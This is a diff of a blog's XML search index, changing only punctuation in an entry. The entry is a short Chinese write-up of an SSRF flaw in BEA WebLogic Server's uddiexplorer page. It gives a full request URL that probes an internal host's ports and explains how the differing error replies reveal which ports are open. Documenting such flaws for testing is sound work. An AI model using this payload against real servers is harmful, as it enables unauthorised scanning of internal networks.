@@ -25,7 +25,7 @@
   <entry>
     <title><![CDATA[BEA Weblogic Server ssrf漏洞利用]]></title>
     <url>%2FBEA-Weblogic-Server-ssrf%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%2F</url>
-    <content type="text"><![CDATA[0x00 前言测试遇到了BEA Weblogic Server ssrf漏洞，记录一下。 0x01 ssrf内网端口探测探测内网主机 10.10.0.217 2222端口 1http://zhengbao.wang/uddiexplorer/SearchPublicRegistries.jsp?operator=http://10.10.0.217:2222&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search 端口开放回显did not have a valid SOAP content-type,如下图 探测1234端口，端口关闭回显could not connect over HTTP to server,如下图 根据回显不同，可做内网端口探测。 其他关于ssrf的利用，可参见博客文章SSRF的一些利用姿势)]]></content>
+    <content type="text"><![CDATA[0x00 前言测试遇到了BEA Weblogic Server ssrf漏洞，记录一下。 0x01 ssrf内网端口探测探测内网主机 10.10.0.217 2222端口 1http://zhengbao.wang/uddiexplorer/SearchPublicRegistries.jsp?operator=http://10.10.0.217:2222&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search 端口开放回显did not have a valid SOAP content-type,如下图 探测1234端口，端口关闭回显could not connect over HTTP to server,如下图 根据回显不同，可做内网端口探测。 其他关于ssrf的利用，可参见博客文章 SSRF的一些利用姿势]]></content>
       <categories>
         <category>web安全</category>
       </categories>
